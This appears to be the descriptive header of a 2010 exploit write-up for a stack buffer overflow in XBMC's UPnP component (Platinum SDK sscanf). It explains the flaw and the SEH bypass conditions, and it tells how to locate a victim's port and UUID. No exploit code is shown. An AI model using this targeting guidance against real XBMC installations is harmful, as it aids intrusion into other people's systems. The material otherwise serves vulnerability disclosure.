=========================================================================
! Exploit Title: Xbmc soap_action_name post upnp sscanf buffer overflow !
=========================================================================
Date: 28th October 2010
=======================
Author: n00b  Realname: *carl cope*
===================================
Software Link: http://xbmc.org/download/
========================================
Version: All versions are affected.
===================================
Tested on: Windows xp sp3,Vista sp2.
XBMC 9.04.1r20672 compiled june 2 2009. <--Version tested.
----------------------------------------------------------
 
 
-Description-
Well i had a little time to spare so i decided to revisit the
xbmc application and give it another look over which is a good
thing as i just have not had to time to work on exploit development
lately and have to put more important things first unfortunately.
 
I decided to test the upnp protocol that was built into xbmc using the
Platinum UPnP SDK.And come across a sscanf buffer overflow
as you can see in the source code at the bottom of this exploit
that 100 bytes is allocated into a temp stack and then passed to
the sscanf function with no bounds check in place then its finally
passed to PLT_HttpHelper::ParseBody which reads the xml body and parse it.
I've tested this exploit on windows and linux both work (Read comments).
 
All versions of xbmc where tested even the Dharma Beta 3 release is
also exploitable.But as ive worked with the xbmc developers before i
know it will be fixed and patched as soon as i have informed them
great guys unlike other vendors i've worked with in the past.
 
I know the vulnerable function was marked with FIX ME = no sscanf.
They must have either missed it or have not got round to fixing this
yet.(See bottom of exploit for code)
 
The buffer overflow exists because of the vulnerable sdk used in the
xbmc application.All versions of xbmc are exploitable but version 9.11
modules is compiled with seh protection.And i know previous release
loaded the zlib1 module which was not compiled with safe seh.

The UUID must be set i've hardcoded this
to make it easy to replace with the victim UUID
you can get the UUID number from the server
by issuing a get request to the vulnerable server
on port 00000 you can use a web browser to do this.
example = http://127.0.0.1:00000
 
 
-Note-
Just a side note the port is random and once the xbmc
application is installed the UUID will be set up along
with the port number at installation so you will have to
do a port scan to find what port the service is running
on but once its found it will be on that port till it
is reinstalled.Also the UUID will stay the same.
 
Universally Unique Identifier

XML example
<UDN>
uuid:0970aa46-ee68-3174-d548-44b656447658
</UDN>
---------------------------------------------------
-Note-
 
I was not going to write an xml paraser just for this
when a web browser and a set of eyes can do it.:)
